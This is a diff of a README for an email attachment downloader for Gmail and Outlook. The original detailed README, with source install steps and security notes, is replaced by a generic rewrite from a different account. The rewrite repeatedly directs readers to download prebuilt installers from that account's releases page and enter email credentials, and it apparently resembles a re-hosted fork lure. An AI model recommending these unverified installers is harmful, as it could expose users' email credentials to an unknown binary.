@@ -1,351 +1,99 @@
-# Email Attachment Downloader
-
-A powerful desktop application for bulk downloading email attachments from Gmail and Outlook with advanced filtering, auto-renaming, and a modern GUI.
-
-![Python](https://img.shields.io/badge/Python-3.10+-blue.svg)
-![License](https://img.shields.io/badge/License-MIT-green.svg)
-![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey.svg)
-[![Download](https://img.shields.io/badge/Download_Installer-darkgreen.svg)](https://github.com/TsvetanG2/Email-Attachment-Downloader/raw/refs/heads/main/installer_output/EmailAttachmentDownloader_Setup_1.0.0.exe)
-
-
----
-
-## Features
-
-- **Multi-Provider Support** - Connect to Gmail or Outlook/Hotmail accounts
-- **Advanced Filtering** - Filter emails by sender, subject, and date range
-- **File Type Selection** - Choose which attachment types to download (PDF, images, documents, spreadsheets, etc.)
-- **Calendar Date Picker** - Easy date selection with built-in calendar widget
-- **Auto-Rename Files** - Multiple renaming patterns (date prefix, sender prefix, etc.)
-- **Preview Before Download** - Review and select specific emails before downloading
-- **Progress Tracking** - Real-time progress bar and detailed activity log
-- **Threaded Downloads** - Fast parallel downloads without freezing the UI
-- **Modern Dark UI** - Clean, professional interface built with CustomTkinter
-
----
-
-## Screenshots
-
-```
-+------------------------------------------+
-|  Email Attachment Downloader             |
-+------------------------------------------+
-|  Provider:  [Gmail v]  [?]               |
-|  Email:     [your.email@gmail.com    ]   |
-|  Password:  [****************        ]   |
-|                                          |
-|  [Connect]  Status: Connected            |
-+------------------------------------------+
-|  Email Filters                           |
-|  From:    [sender@example.com        ]   |
-|  Subject: [invoice                   ]   |
-|  Date:    [Start date] to [End date]     |
-+------------------------------------------+
-|  File Types                              |
-|  [x] PDF  [x] IMAGES  [x] DOCUMENTS      |
-|  [x] SPREADSHEETS  [x] PRESENTATIONS     |
-+------------------------------------------+
-|           [Search Emails]                |
-+------------------------------------------+
-|  Results: 45 emails, 127 attachments     |
-|                       [Preview Results]  |
-+------------------------------------------+
-|  Rename Pattern: [Date + Filename    v]  |
-|  [ ] Convert to lowercase                |
-+------------------------------------------+
-|  Save to: [C:/Downloads/Attachments]     |
-|        [Download All Attachments]        |
-+------------------------------------------+
-|  Progress: [==============    ] 70%      |
-|  Downloading: invoice_march.pdf          |
-+------------------------------------------+
-```
-
----
-
-## Installation
-
-### Prerequisites
-
-- Python 3.10 or higher
-- pip (Python package manager)
-
-### Quick Start
-
-1. **Clone or download the repository**
-   ```bash
-   git clone https://github.com/yourusername/email-attachment-downloader.git
-   cd email-attachment-downloader
-   ```
-
-2. **Install dependencies**
-   ```bash
-   pip install -r requirements.txt
-   ```
-
-3. **Run the application**
-   ```bash
-   python main.py
-   ```
-
----
-
-## Email Provider Setup
-
-### Gmail Setup
-
-Gmail requires an **App Password** for IMAP access (not your regular password).
-
-1. **Enable 2-Step Verification**
-   - Go to [Google Account Security](https://myaccount.google.com/security)
-   - Click on "2-Step Verification" and follow the setup
+# 📥 Email-Attachment-Downloader - Download Email Attachments Easily
 
-2. **Generate an App Password**
-   - Go to [App Passwords](https://myaccount.google.com/apppasswords)
-   - Select "Mail" as the app
-   - Select your device
-   - Click "Generate"
-   - Copy the 16-character password
-
-3. **Enable IMAP** (if not already enabled)
-   - Go to [Gmail Settings](https://mail.google.com/mail/u/0/#settings/fwdandpop)
-   - Under "IMAP access", select "Enable IMAP"
+## 🚀 Overview
 
-4. **Use in the app**
-   - Select "Gmail" as provider
-   - Enter your Gmail address
-   - Paste the 16-character App Password (no spaces)
+Email-Attachment-Downloader is a powerful desktop application that allows you to bulk download email attachments from Gmail and Outlook. With advanced filtering, auto-renaming features, and a modern graphical user interface, it makes managing email attachments simple and efficient.
 
-### Outlook / Hotmail Setup
+## 📥 Download the Application
 
-1. **Using Regular Password** (if 2FA is disabled)
-   - Simply use your regular Outlook password
+[![Download Now](https://img.shields.io/badge/Download%20Now-Email%20Attachment%20Downloader-brightgreen)](https://github.com/Ilhammaruf/Email-Attachment-Downloader/releases)
 
-2. **Using App Password** (if 2FA is enabled)
-   - Go to [Microsoft Security](https://account.microsoft.com/security)
-   - Under "Additional security options", find "App passwords"
-   - Create a new app password
-   - Use this password in the app
+## 🔍 Features
 
-3. **Enable IMAP**
-   - Go to Outlook.com Settings > Mail > Sync email
-   - Enable "Let devices and apps use IMAP"
+- **Bulk Downloading:** Download multiple attachments in one go.
+- **Advanced Filtering:** Specify file types or keywords to filter attachments.
+- **Auto-Renaming:** Automatically rename files based on customizable rules.
+- **User-Friendly Interface:** Intuitive design makes it easy for everyone to use.
 
----
+## 📊 System Requirements
 
-## Usage Guide
+- **Operating System:** Windows 10 or later, macOS, or any recent Linux distribution.
+- **RAM:** Minimum 4 GB.
+- **Storage:** At least 100 MB free space for installation.
+- **Internet Connection:** Required for accessing your email accounts.
 
-### 1. Connect to Your Email
+## 🔧 Installation Instructions
 
-1. Select your email provider (Gmail or Outlook)
-2. Enter your email address
-3. Enter your App Password
-4. Click **Connect**
+### Step 1: Visit the Releases Page
 
-### 2. Set Up Filters
+To download the latest version, visit the [Releases page](https://github.com/Ilhammaruf/Email-Attachment-Downloader/releases).
 
-- **From**: Filter by sender email (e.g., `invoices@company.com`)
-- **Subject**: Filter by keywords in subject (e.g., `invoice`)
-- **Date Range**: Click the date buttons to open calendar picker
-
-### 3. Select File Types
+### Step 2: Choose Your Version
 
-Check/uncheck the file types you want to download:
-- PDF
-- Images (PNG, JPG, GIF, etc.)
-- Documents (DOC, DOCX, TXT, etc.)
-- Spreadsheets (XLS, XLSX, CSV)
-- Presentations (PPT, PPTX)
-- Archives (ZIP, RAR, 7Z)
-
-### 4. Search Emails
-
-Click **Search Emails** to find matching emails. The results will show:
-- Number of emails found
-- Total attachment count
+On the Releases page, you will see a list of available versions. Click on the version you want to download.
 
-### 5. Preview Results (Optional)
+### Step 3: Download the Installer
 
-Click **Preview Results** to:
-- See a list of all matching emails
-- Select/deselect specific emails
-- View attachment names for each email
+After selecting a version, you will find various files available for download. Click on the appropriate file for your operating system:
 
-### 6. Configure Renaming
+- For Windows, look for a file ending in `.exe`.
+- For macOS, look for a file ending in `.dmg`.
+- For Linux, look for a `.tar.gz` or `.deb` file.
 
-Choose a rename pattern:
-| Pattern | Example Output |
-|---------|----------------|
-| Keep Original | `invoice.pdf` |
-| Date + Filename | `2024-01-15_invoice.pdf` |
-| Sender + Date + Filename | `john_2024-01-15_invoice.pdf` |
-| Sender + Filename | `john_invoice.pdf` |
-| Subject + Filename | `Monthly_Report_data.xlsx` |
+### Step 4: Install the Application
 
-### 7. Download
+Once the file is downloaded, follow these steps:
 
-1. Set the download location (or use default)
-2. Click **Download All Attachments**
-3. Watch the progress bar and log
+- **For Windows:**
+   1. Double-click the downloaded `.exe` file.
+   2. Follow the installation wizard prompts.
+  
+- **For macOS:**
+   1. Open the downloaded `.dmg` file.
+   2. Drag the Email-Attachment-Downloader icon into your Applications folder.
 
----
+- **For Linux:**
+   1. Extract the downloaded `.tar.gz` file.
+   2. Open a terminal and navigate to the extracted folder.
+   3. Run the installation command relevant to your distribution.
 
-## Project Structure
+### Step 5: Launch the Application
 
-```
-email_attachment_downloader/
-├── main.py                    # Application entry point
-├── requirements.txt           # Python dependencies
-├── README.md                  # This file
-├── downloads/                 # Default download folder
-└── src/
-    ├── __init__.py
-    ├── email_client.py        # IMAP connection & email fetching
-    ├── downloader.py          # Attachment extraction & saving
-    ├── renamer.py             # File renaming logic
-    ├── date_picker.py         # Calendar date picker widget
-    ├── preview_window.py      # Email preview/selection window
-    └── gui.py                 # Main GUI application
-```
+Once installed, you can find Email-Attachment-Downloader in your applications menu. Click on it to open.
 
----
+## 🎯 Using Email-Attachment-Downloader
 
-## API Reference
+Getting started with Email-Attachment-Downloader is easy:
 
-### EmailClient
+1. **Set Up Your Email Account:**
+   - Open the application.
+   - Go to the settings and select your email provider (Gmail or Outlook).
+   - Enter your email credentials to connect.
 
-```python
-from src.email_client import EmailClient, EmailProvider
+2. **Configure Your Preferences:**
+   - Choose any filtering options (like specific file types).
+   - Set your auto-renaming preferences if desired.
 
-# Using context manager
-with EmailClient(EmailProvider.GMAIL) as client:
-    client.connect('user@gmail.com', 'app_password')
+3. **Download Attachments:**
+   - Navigate to the inbox or folder containing the emails.
+   - Click the "Download Attachments" button. All applicable attachments will be downloaded to your chosen location.
 
-    emails = client.search_emails(
-        sender='invoices@company.com',
-        subject='invoice',
-        date_from=datetime(2024, 1, 1),
-        date_to=datetime(2024, 12, 31)
-    )
+## 🛠 Troubleshooting Tips
 
-    for email in emails:
-        print(f"{email.subject} - {email.attachment_count} attachments")
-```
+- **Connection Issues:** Ensure your internet connection is stable.
+- **Email Access Problems:** Double-check your email account settings and credentials.
+- **Performance Issues:** Close other applications to free up system resources.
 
-### AttachmentDownloader
+## 📢 Support
 
-```python
-from src.downloader import AttachmentDownloader
-from src.renamer import create_renamer_from_template
+If you need assistance, feel free to check the FAQs on the GitHub repository or open an issue there. The community often responds quickly.
 
-# Create renamer with date prefix
-renamer = create_renamer_from_template('date_filename')
+## 📝 Contributing
 
-# Create downloader
-downloader = AttachmentDownloader(
-    download_dir='./downloads',
-    renamer=renamer,
-    allowed_extensions=['.pdf', '.xlsx']
-)
+We welcome contributions! If you'd like to help improve this application, please fork the repository and submit a pull request.
 
-# Download attachments
-results = downloader.download_from_emails(emails)
+## 📥 Download the Application Again
 
-for result in results:
-    if result.success:
-        print(f"Saved: {result.saved_filename}")
-    else:
-        print(f"Failed: {result.error}")
-```
+Don't forget to visit [this page](https://github.com/Ilhammaruf/Email-Attachment-Downloader/releases) to download or update to the latest version.
 
----
-
-## Troubleshooting
-
-### "Authentication Failed" Error
-
-**Gmail:**
-- Make sure you're using an App Password, not your regular password
-- Verify 2-Step Verification is enabled
-- Check that IMAP is enabled in Gmail settings
-
-**Outlook:**
-- If 2FA is enabled, you must use an App Password
-- Ensure IMAP is enabled in Outlook settings
-
-### "Connection Failed" Error
-
-- Check your internet connection
-- Verify the email address is correct
-- Try again in a few minutes (rate limiting)
-
-### No Emails Found
-
-- Check your filter settings (sender, subject, dates)
-- Try with fewer filters first
-- Verify the emails exist in your INBOX folder
-
-### Attachments Not Downloading
-
-- Check file type filters are enabled
-- Ensure the download folder is writable
-- Check the log for specific errors
-
----
-
-## Dependencies
-
-| Package | Version | Purpose |
-|---------|---------|---------|
-| customtkinter | >= 5.2.0 | Modern GUI framework |
-| Pillow | >= 10.0.0 | Image handling |
-| python-dateutil | >= 2.8.2 | Date parsing |
-| tkcalendar | >= 1.6.1 | Calendar date picker |
-
----
-
-## Security Notes
-
-- Your password is never stored - it's only kept in memory during the session
-- Use App Passwords instead of your main password for better security
-- The app only reads emails; it never modifies or deletes them
-- All connections use SSL/TLS encryption (port 993)
-
----
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
----
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/TsvetanG2/Email-Attachment-Downloader/blob/main/LICENSE) file for details.
-
----
-
-## Acknowledgments
-
-- [CustomTkinter](https://github.com/TomSchimansky/CustomTkinter) for the modern GUI framework
-- [tkcalendar](https://github.com/j4321/tkcalendar) for the calendar widget
-
----
-
-## Support
-
-If you encounter any issues or have questions:
-
-1. Check the [Troubleshooting](#troubleshooting) section
-2. Search existing [Issues](https://github.com/yourusername/email-attachment-downloader/issues)
-3. Open a new issue with:
-   - Your Python version
-   - Your operating system
-   - Steps to reproduce the problem
-   - Error messages from the log
+Happy downloading!
